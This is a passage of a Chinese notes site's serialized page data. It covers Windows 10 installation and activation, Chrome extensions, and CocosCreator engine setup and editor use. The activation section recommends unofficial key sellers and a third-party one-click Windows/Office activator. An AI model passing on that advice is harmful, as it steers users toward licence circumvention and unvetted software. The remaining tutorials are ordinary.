说在最后\n\nsoftether相比frp就安全一些，有用户分配、密码验证、秘钥验证等等，并且客户端使用不需要下载什么文件软件等，直接使用系统自带工具连接。如果只是单纯的用rdc远程桌面控制，用frp就足够了；如果要多台机器联机使用就用softether。\n\n最好不要使用该技术应用到国外云服务器上，就算你用了也要低调使用（学习it技术、理智获取国外资讯等），也不要做违法犯罪的事（这个就不用多说了吧）。',charsets:{cjk:!0}},{title:"win10下载与安装",frontmatter:{},regularPath:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/win10%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85.html",relativePath:"book-sketches/电脑工具/win10下载与安装.md",key:"v-198b10d1",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/win10%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85.html",headers:[{level:2,title:"win10启动盘的制作",slug:"win10启动盘的制作",normalizedTitle:"win10启动盘的制作",charIndex:17},{level:2,title:"win10安装",slug:"win10安装",normalizedTitle:"win10安装",charIndex:413},{level:2,title:"win10激活",slug:"win10激活",normalizedTitle:"win10激活",charIndex:622}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"win10启动盘的制作 win10安装 win10激活",content:"# win10下载与安装\n\n\n# win10启动盘的制作\n\n 1. 微软官网有一个MediaCreationTool工具，用以升级win10。\n 2. 首先下载这个工具到本地，并打开这个这个exe，接受它的声明和许可条款，下一步。\n    \n 3. 它可以直接将本机操作系统升级为win10，也可以为其他电脑创建win10的介质（U盘、光盘、ISO文件）；我们选择后者，但不会使用光盘，而是使用的是U盘，继续下一步。\n    \n 4. 语言、体系结构和版本会按照本机自动选择好，当然你也可以选择其他版本，继续下一步。随后会出现让选择U盘或者ISO文件。\n    \n 5. 选择ISO会多出一步“刻录”，也是可以刻录到U盘的，使用UltraISO，有教程也很简单就不展开了。\n 6. U盘准备8G或16G，我的是以NTFS格式进行格式化的，有些UEFI的启动盘要求是FAT32格式；下载或刻录完毕，该U盘就是启动盘了。\n\n\n# win10安装\n\n 1. 安装新系统，C盘里里重要的东西要自己备份到其他盘，因为不会影响到其他盘的资料。\n 2. 再将自己的UEFI或BIOS设置成U盘启动，我的是Dell系列的电脑，可以参照这篇Dell新版BIOS设置U盘启动进行设置。\n 3. 插上你的win10启动盘，重启电脑，选择你U盘的名字再确定，就会开始安装win10系统。\n 4. 安装过程非常简单，按照你需求进行一下选择，安装好会进入新系统。\n\n\n# win10激活\n\n 1. win10系统最好激活一下，虽然表面上说不会影响速度什么的，使用上总感觉会慢；可以自行到官网购买win10激活码，也可以去tb等网站上购买私人渠道的。\n 2. 我这里介绍一个网站：Windows激活工具，会下载一个软件，一键激活windows和office，非常强大和方便。\n 3. 其他网站下载的激活软件总会绑一些乱七八糟的东西给你，很烦也很不安全；这个软件非常不错，很干净，暂时免费也没有失效！记得激活后重启！",normalizedContent:"# win10下载与安装\n\n\n# win10启动盘的制作\n\n 1. 微软官网有一个mediacreationtool工具，用以升级win10。\n 2. 首先下载这个工具到本地，并打开这个这个exe，接受它的声明和许可条款，下一步。\n    \n 3. 它可以直接将本机操作系统升级为win10，也可以为其他电脑创建win10的介质（u盘、光盘、iso文件）；我们选择后者，但不会使用光盘，而是使用的是u盘，继续下一步。\n    \n 4. 语言、体系结构和版本会按照本机自动选择好，当然你也可以选择其他版本，继续下一步。随后会出现让选择u盘或者iso文件。\n    \n 5. 选择iso会多出一步“刻录”，也是可以刻录到u盘的，使用ultraiso，有教程也很简单就不展开了。\n 6. u盘准备8g或16g，我的是以ntfs格式进行格式化的，有些uefi的启动盘要求是fat32格式；下载或刻录完毕，该u盘就是启动盘了。\n\n\n# win10安装\n\n 1. 安装新系统，c盘里里重要的东西要自己备份到其他盘，因为不会影响到其他盘的资料。\n 2. 再将自己的uefi或bios设置成u盘启动，我的是dell系列的电脑，可以参照这篇dell新版bios设置u盘启动进行设置。\n 3. 插上你的win10启动盘，重启电脑，选择你u盘的名字再确定，就会开始安装win10系统。\n 4. 安装过程非常简单，按照你需求进行一下选择，安装好会进入新系统。\n\n\n# win10激活\n\n 1. win10系统最好激活一下，虽然表面上说不会影响速度什么的，使用上总感觉会慢；可以自行到官网购买win10激活码，也可以去tb等网站上购买私人渠道的。\n 2. 我这里介绍一个网站：windows激活工具，会下载一个软件，一键激活windows和office，非常强大和方便。\n 3. 其他网站下载的激活软件总会绑一些乱七八糟的东西给你，很烦也很不安全；这个软件非常不错，很干净，暂时免费也没有失效！记得激活后重启！",charsets:{cjk:!0}},{title:"谷歌浏览器使用",frontmatter:{},regularPath:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%BF%E7%94%A8.html",relativePath:"book-sketches/电脑工具/谷歌浏览器使用.md",key:"v-464604f5",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"devtools",slug:"devtools",normalizedTitle:"devtools",charIndex:14},{level:2,title:"插件",slug:"插件",normalizedTitle:"插件",charIndex:43}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"devtools 插件",content:"# 谷歌浏览器使用\n\n\n# devtools\n\n官方devtools使用教程\n\n\n# 插件\n\n * ColorPick Eyedropper颜色选择器\n * Quick QR二维码生成器\n * Rememberry划词翻译\n * 二箱（以图搜图、自动刷新网页）\n * bilibili哔哩哔哩下载助手",normalizedContent:"# 谷歌浏览器使用\n\n\n# devtools\n\n官方devtools使用教程\n\n\n# 插件\n\n * colorpick eyedropper颜色选择器\n * quick qr二维码生成器\n * rememberry划词翻译\n * 二箱（以图搜图、自动刷新网页）\n * bilibili哔哩哔哩下载助手",charsets:{cjk:!0}},{title:"环境搭建",frontmatter:{},regularPath:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"book-web/CocosCreator游戏引擎/1.环境搭建.md",key:"v-69bdf3c6",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",headers:[{level:2,title:"CocosCreator安装",slug:"cocoscreator安装",normalizedTitle:"cocoscreator安装",charIndex:11},{level:2,title:"代码管理(Git)、扩展包管理(npm)",slug:"代码管理-git-、扩展包管理-npm",normalizedTitle:"代码管理(git)、扩展包管理(npm)",charIndex:520},{level:2,title:"代码编辑器(VSCode)",slug:"代码编辑器-vscode",normalizedTitle:"代码编辑器(vscode)",charIndex:879},{level:2,title:"代码调试(Debugger)",slug:"代码调试-debugger",normalizedTitle:"代码调试(debugger)",charIndex:1937},{level:2,title:"代码测试(mocha、chai)",slug:"代码测试-mocha、chai",normalizedTitle:"代码测试(mocha、chai)",charIndex:2266},{level:2,title:"CocosCreator项目结构",slug:"cocoscreator项目结构",normalizedTitle:"cocoscreator项目结构",charIndex:2523},{level:2,title:"认识CocosCreator编辑器",slug:"认识cocoscreator编辑器",normalizedTitle:"认识cocoscreator编辑器",charIndex:3301}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"CocosCreator安装 代码管理(Git)、扩展包管理(npm) 代码编辑器(VSCode) 代码调试(Debugger) 代码测试(mocha、chai) CocosCreator项目结构 认识CocosCreator编辑器",content:'# 环境搭建\n\n\n# CocosCreator安装\n\n 1. 在引擎官网下载对应操作平台的CocosCreator版本。\n\n 2. 可能会要求先下载安装 Cocos Dashboard，如果已经安装过就直接使用它来下载CocosCreator。在安装Cocos Dashboard过程中，会提示安装 Visual Studio和C++编译配套工具，当前暂不考虑发布到windows平台所以跳过这一步（后面需要发布到原生平台时再考虑）。\n\n 3. 安装好Cocos Dashboard后，打开它并在设置里将 “编辑器目录” 和 “语言” 设置好。然后点开 “编辑器” 标签，下载稳定版本的CocosCreator；它会临时下载到C盘，但不用担心，它过会就自动移动到之前设置好的 “编辑器目录” 里。\n\n 4. 打开 “编辑器目录”，可以看到已经安装好的CocosCreator，双击 “CocosCreator.exe” 就可以使用Cocos Creator来开发了，当然你也可以通过Cocos Dashboard的“项目”来打开Cocos Creator。\n\n 5. 一些注意事项需到引擎官网的“安装和启动”上查看，这里不展开了。\n\n\n# 代码管理(Git)、扩展包管理(npm)\n\n 1. 先下载安装Git 和Node.js。Git的使用可以查看之前写的——Git的使用，Npm的使用可以查看之前写的——Npm的使用。\n\n 2. 定位到之前新建的CocosCreator项目的根目录下，在空白处右击并选择 “Git Bash Here”，在命令行窗口中输入 git init，为项目添加代码管理工具。当然，如果项目已经存在于线上git代码库了，直接使用 git clone xxx 命令克隆下来即可。\n\n 3. 命令行窗口不要关闭，继续输入 npm init ，为该项目添加npm管理工具，后面需要什么依赖再安装什么依赖。当然，你也可以先将 package.json 配置好（需要的依赖包），然后运行 npm install 将所有的依赖下载好。\n\n\n# 代码编辑器(VSCode)\n\n 1. 使用Cocos Creator直接编写脚本效率不高也不方便，所以得给项目专门配置一个代码编辑工具VSCode，VSCode的使用可以查看之前写的——VSCode的使用。\n\n 2. 要为VSCode编辑状态下注入符合Cocos Creator组件脚本使用习惯的语法提示。使用Cocos Creator打开某个项目，然后依次点击主菜单里 “开发者”-“VSCode工作流”-“安装VSCode扩展插件”，控制台里出现“VS Code extension installed to ...”的字样就表示VSCode的cocos提示插件安装成功了。该操作会将Cocos Creator API适配插件安装到VSCode 全局 的插件文件夹中。\n\n 3. 普通提示可能不够，需要再加个插件让VSCode具有引擎API的智能提示。“开发者”-“VSCode工作流”-“更新VSCode智能提示数据”，控制台里出现“API data generated and copied to ...”的字样就表示智能提示配置完毕。该操作会自动将“根据引擎API生成的creator.d.ts数据文件”复制到项目根目录下。\n\n 4. 如果使用的是TypeScript来编写脚本的，那要配置 tsconfig.json。“开发者”-“VSCode工作流”-“添加TypeScript项目配置”，控制台里出现“TypeScript Configuration file has been copied to ...”的字样就表示插件配置完毕。该操作会自动为项目生成tsconfig.json并放到项目根目录下，这个配置并不完善需要自己补充。当然，对应的 tslint.json 也要自己完善一下。没有安装ts的记得 “npm install --save-dev typescript” 安装一下。\n\n 5. 当在VSCode上修改脚本后，需要让CocosCreator编辑器获取焦点（切换到该应用）才能进行编译预览。可以在VSCode上配置编译任务，来触发CocosCreator进行编译。首先下载安装curl，然后在Cocos Creator编辑器选择 “开发者”-“VSCode工作流”-“添加编译任务”。还可以为该任务配置快捷键{"key": "alt+q","command": "workbench.action.tasks.runTask","args": "mycompile"}。\n\n\n# 代码调试(Debugger)\n\n 1. 安装谷歌浏览器；再安装VSCode的插件——Debugger for Chrome，这个在VSCode编辑器的左侧“扩展”里搜索“Debugger for Chrome”再点击“Install”。\n\n 2. 打开CocosCreator编辑器，“开发者”-“VSCode工作流”-“添加Chrome Debug配置”，控制台里出现“Chrome debug setting has been updated to ...”的字样就表示流程配置完毕。该操作会自动为项目的.vscode目录下生成launch.json文件。\n\n 3. 项目预览时使用的端口要与launch.json里的url后面的端口保持一致。\n\n\n# 代码测试(mocha、chai)\n\n 1. 引擎里的元素在Node环境下可能跑不起来（没有Window），所以用单元测试测跟引擎元素无关的逻辑。这样只需要用到mocha+chai，而mochawesome、nyc两种报告其实没什么必要。\n\n 2. 关于mocha和chai的内容可以查看这篇——基于mocha+chai的单元测试。\n\n 3. 可以等引擎团队推出专门的测试框架（unity就有自己的测试框架）；自己写的话，要引一些包修改一些东西有些麻烦，平常使用mock数据来对自己的组件进行测试就可以了。\n\n\n# CocosCreator项目结构\n\n    打开Cocos Creator，根据需要选择新建空项目还是实例项目；然后在底部填好项目创建目录，最后点击“新建”即可。创建之后的项目有特定的文件夹结构，可以稍微了解一下。\n\nProjectName（项目文件夹）\n  │--assets （ 资源文件夹：存放游戏所需的本地资源、脚本和第三方库文件。会生出对应的.meta文件。）\n  │--library （ 资源库：assets中的资源导入后生成的，后面会被处理成最终游戏发布时需要的形式。）\n  │--local（ 本地设置：项目在本机上的配置信息，包括编辑器面板布局，窗口大小，位置等信息。）\n  │--packages（ 扩展插件文件夹：存放项目里的自定义插件。删除插件时只需删除对应文件夹即可。）\n  │--settings （ 项目设置： 保存项目相关的设置，如构建发布菜单里的包名、场景和平台选择等。）\n  │--temp（ 临时文件夹：用于缓存一些CocosCreator在本地的临时文件。）\n  │--.gitignore（ git忽略设置：设置项目中一些无需提交到git的文件或文件夹。）\n  │--creator.d（ 智能提示：CocosCreator生成的智能提示文件，用于编辑器上编辑时出现的智能提示。）\n  │--jsconfig.json（ javascript配置：用于配置项目的js版本信息、基本规范等。）\n  │--project.json（ 同assets的.meta：作为验证CocosCreator项目合法性的标志。两者合法才能打开项目。）\n  │--tsconfig.json（ typescript配置：用于配置项目的ts版本信息、基本规范等。）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 认识CocosCreator编辑器\n\n * CocosCreator编辑器主要由 资源管理器、场景编辑器、层级管理器、属性检查器、控件库、动画编辑器、控制台 等组成。\n * 项目打开时，默认的界面布局如下\n   \n * 可以对它们进行移动或组合，还可以改变他们的大小边界。想恢复原始界面，可以点击上方的 “布局”-“恢复默认布局”，当然你也可以选择 “经典布局” 和 “竖屏游戏布局”。',normalizedContent:'# 环境搭建\n\n\n# cocoscreator安装\n\n 1. 在引擎官网下载对应操作平台的cocoscreator版本。\n\n 2. 可能会要求先下载安装 cocos dashboard，如果已经安装过就直接使用它来下载cocoscreator。在安装cocos dashboard过程中，会提示安装 visual studio和c++编译配套工具，当前暂不考虑发布到windows平台所以跳过这一步（后面需要发布到原生平台时再考虑）。\n\n 3. 安装好cocos dashboard后，打开它并在设置里将 “编辑器目录” 和 “语言” 设置好。然后点开 “编辑器” 标签，下载稳定版本的cocoscreator；它会临时下载到c盘，但不用担心，它过会就自动移动到之前设置好的 “编辑器目录” 里。\n\n 4. 打开 “编辑器目录”，可以看到已经安装好的cocoscreator，双击 “cocoscreator.exe” 就可以使用cocos creator来开发了，当然你也可以通过cocos dashboard的“项目”来打开cocos creator。\n\n 5. 一些注意事项需到引擎官网的“安装和启动”上查看，这里不展开了。\n\n\n# 代码管理(git)、扩展包管理(npm)\n\n 1. 先下载安装git 和node.js。git的使用可以查看之前写的——git的使用，npm的使用可以查看之前写的——npm的使用。\n\n 2. 定位到之前新建的cocoscreator项目的根目录下，在空白处右击并选择 “git bash here”，在命令行窗口中输入 git init，为项目添加代码管理工具。当然，如果项目已经存在于线上git代码库了，直接使用 git clone xxx 命令克隆下来即可。\n\n 3. 命令行窗口不要关闭，继续输入 npm init ，为该项目添加npm管理工具，后面需要什么依赖再安装什么依赖。当然，你也可以先将 package.json 配置好（需要的依赖包），然后运行 npm install 将所有的依赖下载好。\n\n\n# 代码编辑器(vscode)\n\n 1. 使用cocos creator直接编写脚本效率不高也不方便，所以得给项目专门配置一个代码编辑工具vscode，vscode的使用可以查看之前写的——vscode的使用。\n\n 2. 要为vscode编辑状态下注入符合cocos creator组件脚本使用习惯的语法提示。使用cocos creator打开某个项目，然后依次点击主菜单里 “开发者”-“vscode工作流”-“安装vscode扩展插件”，控制台里出现“vs code extension installed to ...”的字样就表示vscode的cocos提示插件安装成功了。该操作会将cocos creator api适配插件安装到vscode 全局 的插件文件夹中。\n\n 3. 普通提示可能不够，需要再加个插件让vscode具有引擎api的智能提示。“开发者”-“vscode工作流”-“更新vscode智能提示数据”，控制台里出现“api data generated and copied to ...”的字样就表示智能提示配置完毕。该操作会自动将“根据引擎api生成的creator.d.ts数据文件”复制到项目根目录下。\n\n 4. 如果使用的是typescript来编写脚本的，那要配置 tsconfig.json。“开发者”-“vscode工作流”-“添加typescript项目配置”，控制台里出现“typescript configuration file has been copied to ...”的字样就表示插件配置完毕。该操作会自动为项目生成tsconfig.json并放到项目根目录下，这个配置并不完善需要自己补充。当然，对应的 tslint.json 也要自己完善一下。没有安装ts的记得 “npm install --save-dev typescript” 安装一下。\n\n 5. 当在vscode上修改脚本后，需要让cocoscreator编辑器获取焦点（切换到该应用）才能进行编译预览。可以在vscode上配置编译任务，来触发cocoscreator进行编译。首先下载安装curl，然后在cocos creator编辑器选择 “开发者”-“vscode工作流”-“添加编译任务”。还可以为该任务配置快捷键{"key": "alt+q","command": "workbench.action.tasks.runtask","args": "mycompile"}。\n\n\n# 代码调试(debugger)\n\n 1. 安装谷歌浏览器；再安装vscode的插件——debugger for chrome，这个在vscode编辑器的左侧“扩展”里搜索“debugger for chrome”再点击“install”。\n\n 2. 打开cocoscreator编辑器，“开发者”-“vscode工作流”-“添加chrome debug配置”，控制台里出现“chrome debug setting has been updated to ...”的字样就表示流程配置完毕。该操作会自动为项目的.vscode目录下生成launch.json文件。\n\n 3. 项目预览时使用的端口要与launch.json里的url后面的端口保持一致。\n\n\n# 代码测试(mocha、chai)\n\n 1. 引擎里的元素在node环境下可能跑不起来（没有window），所以用单元测试测跟引擎元素无关的逻辑。这样只需要用到mocha+chai，而mochawesome、nyc两种报告其实没什么必要。\n\n 2. 关于mocha和chai的内容可以查看这篇——基于mocha+chai的单元测试。\n\n 3. 可以等引擎团队推出专门的测试框架（unity就有自己的测试框架）；自己写的话，要引一些包修改一些东西有些麻烦，平常使用mock数据来对自己的组件进行测试就可以了。\n\n\n# cocoscreator项目结构\n\n    打开cocos creator，根据需要选择新建空项目还是实例项目；然后在底部填好项目创建目录，最后点击“新建”即可。创建之后的项目有特定的文件夹结构，可以稍微了解一下。\n\nprojectname（项目文件夹）\n  │--assets （ 资源文件夹：存放游戏所需的本地资源、脚本和第三方库文件。会生出对应的.meta文件。）\n  │--library （ 资源库：assets中的资源导入后生成的，后面会被处理成最终游戏发布时需要的形式。）\n  │--local（ 本地设置：项目在本机上的配置信息，包括编辑器面板布局，窗口大小，位置等信息。）\n  │--packages（ 扩展插件文件夹：存放项目里的自定义插件。删除插件时只需删除对应文件夹即可。）\n  │--settings （ 项目设置： 保存项目相关的设置，如构建发布菜单里的包名、场景和平台选择等。）\n  │--temp（ 临时文件夹：用于缓存一些cocoscreator在本地的临时文件。）\n  │--.gitignore（ git忽略设置：设置项目中一些无需提交到git的文件或文件夹。）\n  │--creator.d（ 智能提示：cocoscreator生成的智能提示文件，用于编辑器上编辑时出现的智能提示。）\n  │--jsconfig.json（ javascript配置：用于配置项目的js版本信息、基本规范等。）\n  │--project.json（ 同assets的.meta：作为验证cocoscreator项目合法性的标志。两者合法才能打开项目。）\n  │--tsconfig.json（ typescript配置：用于配置项目的ts版本信息、基本规范等。）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 认识cocoscreator编辑器\n\n * cocoscreator编辑器主要由 资源管理器、场景编辑器、层级管理器、属性检查器、控件库、动画编辑器、控制台 等组成。\n * 项目打开时，默认的界面布局如下\n   \n * 可以对它们进行移动或组合，还可以改变他们的大小边界。想恢复原始界面，可以点击上方的 “布局”-“恢复默认布局”，当然你也可以选择 “经典布局” 和 “竖屏游戏布局”。',charsets:{cjk:!0}},{title:"熟悉编辑器",frontmatter:{},regularPath:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E7%86%9F%E6%82%89%E7%BC%96%E8%BE%91%E5%99%A8.html",relativePath:"book-web/CocosCreator游戏引擎/2.熟悉编辑器.md",key:"v-4afda086",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E7%86%9F%E6%82%89%E7%BC%96%E8%BE%91%E5%99%A8.html",headers:[{level:2,title:"基本界面",slug:"基本界面",normalizedTitle:"基本界面",charIndex:12},{level:2,title:"资源管理器",slug:"资源管理器",normalizedTitle:"资源管理器",charIndex:41},{level:2,title:"场景编辑器",slug:"场景编辑器",normalizedTitle:"场景编辑器",charIndex:47},{level:2,title:"层级管理器",slug:"层级管理器",normalizedTitle:"层级管理器",charIndex:53},{level:2,title:"属性检查器",slug:"属性检查器",normalizedTitle:"属性检查器",charIndex:59},{level:2,title:"控件库",slug:"控件库",normalizedTitle:"控件库",charIndex:65},{level:2,title:"动画编辑器",slug:"动画编辑器",normalizedTitle:"动画编辑器",charIndex:69},{level:2,title:"控制台",slug:"控制台",normalizedTitle:"控制台",charIndex:75},{level:2,title:"主菜单",slug:"主菜单",normalizedTitle:"主菜单",charIndex:3669},{level:2,title:"工具栏",slug:"工具栏",normalizedTitle:"工具栏",charIndex:3771},{level:2,title:"编辑器设置",slug:"编辑器设置",normalizedTitle:"编辑器设置",charIndex:3933},{level:2,title:"项目设置",slug:"项目设置",normalizedTitle:"项目设置",charIndex:4358}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"基本界面 资源管理器 场景编辑器 层级管理器 属性检查器 控件库 动画编辑器 控制台 主菜单 工具栏 编辑器设置 项目设置",content:"# 熟悉编辑器\n\n\n# 基本界面\n\n    CocosCreator编辑器主要由 资源管理器、场景编辑器、层级管理器、属性检查器、控件库、动画编辑器、控制台 等组成。\n\n    项目打开时，默认的界面布局如下图\n\n\n    可以对这些面板进行移动、组合，以适应不同项目和开发者的需要。比如在边界处控制某个组件的大小，鼠标长按组件的名称标签可以拖动它去别的地方等等。如果你想将已改变的界面恢复，可以点击上方的 “布局”-“恢复默认布局”，当然你也可以选择 “经典布局” 和 “竖屏游戏布局”。\n\n\n# 资源管理器\n\n    资源管理器 显示了项目资源文件夹（assets）中所有资源（图片、动画、声音等），在编辑中会自动同步在操作系统中对项目资源文件夹的修改。\n\n    资源列表：展示用的常见的树结构，也是代码编辑器（文件列表）常用的，所以 资源列表的一些基本功能类似于操作文件列表（删除、复制、粘贴、拖拽、重命名等）。文件夹形式的资源可以展开/折叠；非文件夹形式的就是资源文件了，会隐藏扩展名但会用图标显示，在下方还会显示资源路径。\n    导入资源：可以直接将资源文件拖入资源管理器中，也可以选择“文件”-“资源导入...”。如果是创建新资源，可以使用左上角的“+”号。\n    搜索资源：在搜索框里输入资源名称，再点击搜索按钮。当然也可以选择你要搜索的类型。     .meta文件：在这个链接里有很详细的介绍，这里不展开了。\n\n\n# 场景编辑器\n\n    场景编辑器 是内容创作的核心工作区域，可以将资源或UI组件拖入场景编辑中，对它们进行摆放来搭建一个游戏的具体场景。\n\n\n    视图移动和定位：可以通过鼠标右键的拖拽来移动，鼠标滚轮是控制视图缩放的并且是以鼠标悬停的地方为参考点。\n\n    坐标系和网格：视图中有网格，用来表示世界坐标系中各个点的位置信息，单位是像素；左下角是(0, 0)点。\n\n    设计分辨率指示框：紫色线框里的是默认显示区域，这块区域是由设计分辨率决定的。\n\n    节点的选取：鼠标悬停到某个组件节点上，会出现灰色框（位置、大小）；单击它会出现蓝色框，并且可以进行变换。多选的话，可以用鼠标左键拉一个矩形出来，矩形里的就是你多选中的节点，还可以按住ctrl再去选节点，这样也是多选。当然你也可以通过层级管理器来选中它们（双击或按住ctrl再单击）。\n\n    控制手柄：场景编辑器中在特定编辑状态下显示出的可用鼠标进行交互操作的控制器。这些控制器只用来辅助编辑，不会在游戏运行时显示。\n\n    变换工具：\n        1.移动变换工具（快捷键W）：会出现红绿两个箭头和蓝色方块组成的移动控制手柄，可以沿着箭头方向移动，也可以用鼠标拖拽蓝色方块进行移动。\n        2.旋转变换工具（快捷键E）：会出现一个箭头和一个圆环组成的旋转控制手柄，可以拖拽箭头或圆环内任意一点就可以旋转节点。\n        3.缩放变换工具（快捷键R）：会出现红绿黄三个方块组成的缩放控制手柄，拖动红色是横向缩放、拖动绿色是纵向缩放、拖动黄色是按比例缩放。\n        4.矩形变换工具（快捷键T）：会出现一个矩形手柄，可以对矩形的边和顶点进行拖拽，以改变节点的大小和位置。\n\n\n# 层级管理器\n\n    场景编辑 中打开的场景会在 层级管理器 中展示它的所有节点，可以在层级管理器里创建、删除、修改（层级或顺序）节点，其他功能同资源管理器一样（复制粘贴重命名等）。\n\n    创建节点：可以使用左上角的“+”号或者鼠标右键的“创建节点”，可以创建不同类型的节点，如果你想用一个资源来创建节点，就直接从 资源管理器 中将资源拖拽进 层级管理器 中。\n\n    删除节点：先选中一个节点，然后按下“Delete”或者“Ctrl+Backspace”，鼠标右键也可以。\n\n    层级或顺序修改：使用鼠标拖拽。\n\n    锁定节点：鼠标悬停在某个节点上，左侧会出现一把小锁，点击它就会让节点锁定然后不能被选中。\n\n\n# 属性检查器\n\n    属性检查器 是用来查看并编辑节点或资源的属性的，也就是说 场景编辑器 或 层级管理器 中选中的节点会在属性检查器中显示该节点的大小、位置、缩放、旋转等， 资源管理器 中选中的资源会在属性检查器中显示资源的类型、寻址模式、过滤模式等。\n\n    激活开关：属性检查器顶部是节点名称，旁边就是激活开关。隐藏or显示当前节点（包括子节点），可以理解为visible。\n\n    节点属性：Node便签下就是一些属性了，悬停到这些属性上会有提示信息。Node标签右侧有个设置按钮，可以重置Node标签下的属性、复制这些属性、粘贴别处的属性。\n\n    组件属性：节点属性下面，会列出节点上挂载的所有组件和组件的属性。也有名称、激活开关、设置、一些属性，它额外有一个“帮助文档”，点击它可以直接跳到当前组件的帮助文档链接。\n\n    编辑属性：属性是组件脚本中声明的公开并可被序列化存储在场景和动画数据中的变量，在属性检查器中可以编辑它们的值，它们值的类型分为：\n        值类型属性：数字、字符串、布尔值、向量、枚举等简单的占用很少内存的变量类型。\n        引用类型属性：是比较复杂的对象，例如节点、组件、资源、脚本等，这种需要将其拖拽到属性栏中来完成引用类型属性的赋值。\n\n    多批量设置属性：在 资源管理器 中选中多个资源，然后 属性检查器 中会显示出选中的资源数量以及可编辑的资源属性。节点的多批量设置属性也是类似。\n\n\n# 控件库\n\n    控件库 是一个可视化控件仓库，包含内置控件、自定义控件、云组件，可以将你需要的控件拖拽到层级管理器或资源管理器中。\n\n    内置控件：是编辑器内置的预设节点，有默认资源的精灵（Sprite）、包含背景图和文字标题的按钮（Button）以及已经配置好内容和滚动条的滚动视图（ScrollView）等。\n\n    自定义控件：用户自己制作的预制资源（Prefab），再将这些预制资源从 资源管理器 中拖拽到“自定义控件”这个标签下，以完成自己定义的控件，然后就可以像内置控件一样在一些场景中反复使用。\n\n\n# 动画编辑器\n\n    动画编辑器 是用来编辑节点下的Animation组件的。\n\n    常用按钮：左上角有一排常用的按钮，分别是“打开/关闭编辑模式”、“跳到第一帧”、“跳到上一帧”、“播放动画”、“跳到下一帧”、“插入帧事件”、“新增clips”。\n\n    时间轴和关键帧：左侧上方带有刻度的这部分是动画的时间轴，上面也会显示一些自定义事件（关键帧）。时间轴旁边还有一个“01-07”的字样，意思是当前处在1秒第7帧。\n        同一刻度不同帧率：当帧率为30时，“01-07”表示动画开始后的第1 + 7/30 = 1.2333 秒；当帧率为10时，“01-07”表示动画开始后的第1 + 7/10 = 1.7秒。\n        事件所处的关键帧，它的的总帧数不受帧率改变而影响。例如当前帧率30，向“01-07”刻度上添加了关键帧，该关键帧位于动画开始后总第37帧。之后把帧率修改为10，该关键帧仍然处在动画开始后第37帧（总帧数37不变），而此时关键帧所在位置的刻度读数为“03-07”。\n\n    其他：“属性列表”上方是层级管理（节点树）和节点内关键帧的预览区域，下方则是属性和关键帧信息。\n\n    快捷键：\n\n * left：向前移动一帧，如果已经在第 0 帧，则忽略当前操作\n * right：向后移动一帧\n * delete：删除当前所选中的关键帧\n * k：正向的播放动画，抬起后停止\n * j：反向播放动画，抬起后停止\n * ctrl / cmd + left：跳转到第 0 帧\n * ctrl / cmd + right：跳转到有效的最后一帧\n\n\n# 控制台\n\n    控制台 会显示报错、警告、编辑器或引擎生成的日志信息。\n\n    日志等级：\n\n * 日志(Log)：灰色文字，通常用来显示正在进行的操作。\n * 提示(Info)：蓝色文字，用来显示重要提示信息。\n * 成功(Success)：绿色文字，表示当前执行的操作已成功完成。\n * 警告(Warn)：黄色文字，用来提示用户最好进行处理的异常情况，但不处理也不会影响运行。\n * 报错(Error)：红色文字，表示出现了严重错误，必须解决才能进行下一步操作或运行游戏。\n\n    设置以及功能：\n        1.合并：相同重复信息会被合并成一条，旁边会有黄色信息提示有多少条被合并了。\n        2.清空：左上角有一个清空按钮，如果要每次运行前清空可以到“设置”里设置。         3.日志过滤：可是按照日志等级来过滤，也可以输入关键字来过滤，还提供了正则表达式来过滤。\n\n\n# 主菜单\n\n    主菜单 包含有“文件”、“编辑”、“节点”、“组件”、“项目”、“面板”、“布局”、“扩展”、“开发者”和“帮助”。可以直接打开编辑器一一查看，都是字面上的意思，不再展开说明\n\n\n\n# 工具栏\n\n    工具栏 包含有“变换工具”、“预览工具”、“预览地址（二维码）”、“快捷打开项目文件夹”。\n\n    之前已经提过“变换工具”了，“预览工具”和“预览地址”也好理解，就是以模拟器还是浏览器去预览运行游戏，预览地址可以还是二维码用手机也可以预览。剩下的就是项目地址快捷打开、编辑器安装地址快捷打开。\n\n\n# 编辑器设置\n\n    编辑器设置 包含有“常规”、“数据编辑”、“原生开发环境”、“预览运行”。\n\n    需要注意的几点：\n\n * “构建日志是否在控制台显示”：这一项在选中状态时，构建发布原生项目的过程日志会直接显示在控制台面板里。非选中状态时，构建发布原生项目的日志会保存在 %USER/.CocosCreator/logs/native.log\n * “meta 文件备份时显示确认”：在 meta 文件所属的资源丢失时，是否弹出对话框提示备份或删除 meta 文件。如果选择备份，可以在稍后手动恢复资源，并将 meta 文件手动拷贝回项目 assets 目录，防止资源相关的重要设置（如场景、prefab）丢失\n * “默认开启 